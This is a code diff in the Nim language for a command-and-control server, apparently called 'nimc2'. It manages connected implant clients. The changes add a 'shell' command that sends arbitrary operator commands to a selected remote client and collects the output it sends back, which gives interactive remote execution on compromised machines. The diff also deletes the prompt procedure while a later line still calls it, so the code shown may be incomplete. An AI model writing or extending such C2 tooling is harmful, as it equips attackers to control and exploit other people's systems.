@@ -1,7 +1,7 @@
 import asyncdispatch, asyncnet, threadpool
 import strutils, terminal
 
-import asyncdispatch, asynchttpserver, ws
+import asyncdispatch, asynchttpserver, ws, asyncfutures
 
 import types, logging
 
@@ -11,9 +11,14 @@ proc newServer(): C2Server =
 var server = newServer()
 infoLog "server initialized"
 
+var clResp: Future[void]
+
 proc processMessages(server: C2Server, client: Client) {.async.} =
   while true:
     let line = await client.socket.recvLine()
+    
+    let args = line.split(":")
+    let argsn = len(args)
 
     if line.len == 0:
       
@@ -30,6 +35,12 @@ proc processMessages(server: C2Server, client: Client) {.async.} =
       let hostname = line.split(":")[1]
       server.clients[client.id].loaded = true
       server.clients[client.id].hostname = hostname
+    if line.startsWith("OUTPUT:"):
+      logClientOutput client, args[1], args[2]
+      if not clResp.isNil():
+        clResp.complete()
+        clResp = nil
+
     # for c in server.clients:
     #   if c.id != client.id and c.connected:
     #     await c.socket.send(line & "\c\l")
@@ -57,12 +68,6 @@ proc acceptSocketClients(port = 12345) {.async.} =
     server.clients.add(client)
     asyncCheck processMessages(server, client)
 
-proc prompt(handlingClient: int, server: C2Server) = 
-  var menu: string = "main"
-  if handlingClient > -1:
-    menu = "client:"&intToStr(handlingClient)
-  stdout.styledWrite fgBlue, "(", menu ,")", fgRed, " nimc2 > " , fgWhite
-
 proc procStdin() {.async.} =
   var handlingClient: int = -1
 
@@ -72,15 +77,21 @@ proc procStdin() {.async.} =
     if messageFlowVar.isReady():
       
       let cmd = ^messageFlowVar
+      let args = cmd.split(" ")
+      let argsn = len(args)
 
       if cmd == "clients":
         for client in server.clients:
           if client.connected:
-            stdout.styledWriteLine fgGreen, "[+] ", $client, " (alive)", fgWhite
+            stdout.styledWriteLine fgGreen, "[+] ", @client, fgWhite
           else:
-            stdout.styledWriteLine fgRed, "[-] ", $client, " (dead)", fgWhite
+            stdout.styledWriteLine fgRed, "[-] ", @client, fgWhite
       if cmd.startsWith("switch"):
-        handlingClient = parseInt(cmd.split(" ")[1])
+        for client in server.clients:
+          if client.id == parseInt(args[1]):
+            handlingClient = parseInt(args[1])
+        if handlingClient != parseInt(args[1]):
+          infoLog "client not found"
       if cmd.startsWith("ping"):
         for client in server.clients:
           if client.id == parseInt(cmd.split(" ")[1]):
@@ -90,7 +101,14 @@ proc procStdin() {.async.} =
         for client in server.clients:
           if client.id == handlingClient:
             echo $client
-      if cmd == "back":
+      if cmd.startsWith("shell"):
+        for client in server.clients:
+          if client.id == handlingClient:
+            await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
+            if clResp.isNil():
+              clResp = newFuture[void]()
+              await clResp
+      if cmd == "back": 
         handlingClient = -1
 
       prompt(handlingClient, server)
